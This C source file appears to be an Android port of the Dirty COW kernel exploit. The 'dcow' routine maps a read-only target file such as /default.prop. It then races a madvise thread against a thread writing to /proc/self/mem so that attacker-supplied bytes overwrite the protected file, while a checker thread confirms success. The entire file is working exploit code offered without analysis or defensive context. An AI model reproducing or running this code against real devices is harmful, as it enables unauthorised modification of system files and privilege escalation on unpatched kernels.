#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

#define LOOP   0x100000
#define TIMEOUT 10

struct mem_arg  {
	void *offset;
	void *patch;
	off_t patch_size;
	const char *fname;
	volatile int stop;
	int success;
};

static void *checkThread(void *arg) {
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;
	struct stat st;
	int i;
	char * newdata = malloc(mem_arg->patch_size);
	for(i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
		int f=open(mem_arg->fname, O_RDONLY);
		if (f == -1) {
			LOGV("could not open %s", mem_arg->fname);
			break;
		}
		if (fstat(f,&st) == -1) {
			LOGV("could not stat %s", mem_arg->fname);
			close(f);
			break;
		}
		read(f, newdata, mem_arg->patch_size);
		close(f);

		int memcmpret = memcmp(newdata, mem_arg->patch, mem_arg->patch_size);
		if (memcmpret == 0) {
			mem_arg->stop = 1;
			mem_arg->success = 1;
			return 0;
		}
		usleep(100 * 1000);
	}
	mem_arg->stop = 1;
	return 0;
}
static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	LOGV("[*] madvise = %p %zd", addr, size);

	for(i = 0; i < LOOP && !mem_arg->stop; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	LOGV("[*] madvise = %d %d", c, i);
	mem_arg->stop = 1;
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	mem_arg = (struct mem_arg *)arg;
	unsigned char *p = mem_arg->patch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1) {
		LOGV("open(\"/proc/self/mem\"");
	}

	for (i = 0; i < LOOP && !mem_arg->stop; i++) {
		lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);
	}

	LOGV("[*] /proc/self/mem %d %i", c, i);

	close(fd);

	mem_arg->stop = 1;
	return NULL;
}

static void exploit(struct mem_arg *mem_arg)
{
	pthread_t pth1, pth2, pth3;

	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->stop = 0;
	mem_arg->success = 0;
	pthread_create(&pth3, NULL, checkThread, mem_arg);
	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth3, NULL);
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

int dcow(int argc, const char * argv[])
{
	if (argc < 2) {
		LOGV("usage %s /data/local/tmp/default.prop /default.prop", argv[0]);
		return 0;
	}

	const char * fromfile = argv[1];
	const char * tofile = argv[2];
	LOGV("dcow %s %s", fromfile, tofile);
	
	struct mem_arg mem_arg;
	struct stat st;
	struct stat st2;

	int f = open(tofile, O_RDONLY);
	if (f == -1) {
		LOGV("could not open %s", tofile);
		return -1;
	}
	if (fstat(f,&st) == -1) {
		LOGV("could not stat %s", tofile);
		return 1;
	}

	int f2=open(fromfile, O_RDONLY);
	if (f2 == -1) {
		LOGV("could not open %s", fromfile);
		return 2;
	}
	if (fstat(f2,&st2) == -1) {
		LOGV("could not stat %s", fromfile);
		return 3;
	}

	size_t size = st2.st_size;
	if (st2.st_size != st.st_size) {
		LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", (unsigned long long)st.st_size, (unsigned long long)st2.st_size);
		if (st2.st_size > st.st_size) {
			LOGV("corruption?\n");
		}
	}

	if (st.st_size > st2.st_size) {
		size = st.st_size;
		LOGV("[*] padding to %zd", size);
	}

	LOGV("[*] size %zd", size);
	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL) {
		return 4;
	}

	memset(mem_arg.patch, 0, size);
	mem_arg.patch_size = size;
	mem_arg.fname = argv[2];

	read(f2, mem_arg.patch, size);
	close(f2);

	/*read(f, mem_arg.unpatch, st.st_size);*/

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		LOGV("mmap");
		return 5;
	}

	LOGV("[*] mmap %p", map);

	mem_arg.offset = map;

	exploit(&mem_arg);

	close(f);
	// to put back
	/*exploit(&mem_arg, 0);*/
	if (mem_arg.success == 0) {
		return -1;
	}

	return 0;
}